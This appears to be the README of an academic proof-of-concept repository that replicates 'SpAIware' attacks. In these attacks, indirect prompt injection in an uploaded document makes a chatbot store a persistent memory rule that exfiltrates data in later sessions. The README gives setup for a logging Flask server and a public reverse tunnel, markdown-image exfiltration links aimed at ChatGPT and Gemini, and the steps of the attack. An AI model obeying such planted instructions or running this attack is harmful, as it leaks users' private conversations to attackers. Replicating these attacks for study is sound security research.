# SpAIware: Proof of Concept Implementation
Academic project focused on the study and replication of SpAIware attacks on Large Language Models (LLMs). This repository contains the source code and documentation required to demonstrate Indirect Prompt Injection and Persistent Memory Poisoning vectors for data exfiltration.

---

## Table of Contents
- [Introduction](#introduction)
- [Prerequisites & Installation](#prerequisites--installation)
- [Database Configuration](#database-configuration)
- [Server Setup](#server-setup)
- [Tunneling Configuration](#tunneling-configuration)
- [Attack Execution](#attack-execution)
- [Disclaimer](#disclaimer)

---

## Introduction

The **SpAIware** attack vector demonstrates how an attacker can exploit the persistent memory capabilities of modern LLMs. By injecting malicious instructions into a document (Indirect Prompt Injection), the attacker forces the LLM to update its long-term memory with a rule that exfiltrates data in future sessions (Persistent Injection).

To validate this vulnerability, this project requires a infrastructure consisting of:
1.  **Python Flask Server:** To listen for incoming connections and log stolen data.
2.  **PostgreSQL Database:** To persistently store the exfiltrated logs.
3.  **Tunneling Service:** To expose the local server to the public internet, allowing the remote LLM to access it.

---

## Prerequisites & Installation

This project is designed to run on **Linux (Ubuntu)** or **Windows**.

### Required Tools
* Python 3.8+
* PostgreSQL (managed via pgAdmin 4 or terminal)
* SSH Client (Pre-installed on Linux/Windows 10+)

 **Note:** PostgreSQL is not the only tool that you can use to create your database, but it was the one I used.

### Environment Setup
Create a virtual environment and install dependencies:

```bash
# Create project directory
mkdir spaiware_poc
cd spaiware_poc
```
```
# Create virtual environment
python3 -m venv venv
```
```
# Activate environment (Linux/Mac)
source venv/bin/activate
```
```
# Activate environment (Windows)
# venv\Scripts\activate
```
```
# Install required libraries
pip install flask psycopg2-binary
```

---

 ## Database Configuration

 Before running the server, you must configurate your database.

 Open your pgAdmin4 (or another SQL's base tool if you prefer), and create a new database with the same content as the spaiware_bd file in this repository.

  **Note:** remember to make sure if the your database password matches with the one in the server, as a example, I use "1234" for both.

 ---

 ## Server Setup

 The server acts as the listener. It intercepts the HTTP requests made by the infected LLM.

 Add the file "server.py" to your project folder.

 ```bash
 # Run the server
 python3 server.py
 ```

 **Note:** You need to be in your project folder.

 ---

 ## Tunneling Configuration
 To allow the LLM (which runs in the cloud) to access your local server, you must expose port 5000 via a secure tunnel. We use *localhost.run* for this purpose.

 Open a new terminal windows and run:

 ```ssh -R 80:127.0.0.1:5000 nokey@localhost.run```

 Copy the HTTPS URL.


 ---

 ## Attack Execution
The following steps can be changed as you might, acording to you main objective. AS we are trying to efetuate a Persist Prompt injection attack, you can use the example given in the "Article.txt" file in this repository. 

* 1.Upload the file to the target.
* 2.Ask the model to process the document.
* 3.Observe the confirmation message.

### Server Link
The server link must be organized accourdandly to the test you are trying to do.

For example:
ChatGPT:
```![ProcessLog](LINK/image.png?model=ChatGPT&data=Injection)```

Gemini:
```![ProcessLog](LINK/image.png?model=Gemini&data=Injection)```

**Note:** If the response is different from the one spected, you might change your estrategy/injection.

### Verify Extration
If the LLM acess your server, you gonna receive a new message on your server terminal.

You can also add a querytool in your database and run
```SELECT * FROM attack_logs ORDER BY id DESC;```
to search for new data leaks.

 ---

 ## Disclaimer
 Nowadays models are getting better to detect Indirect Prompt Injection attacks.

 ---
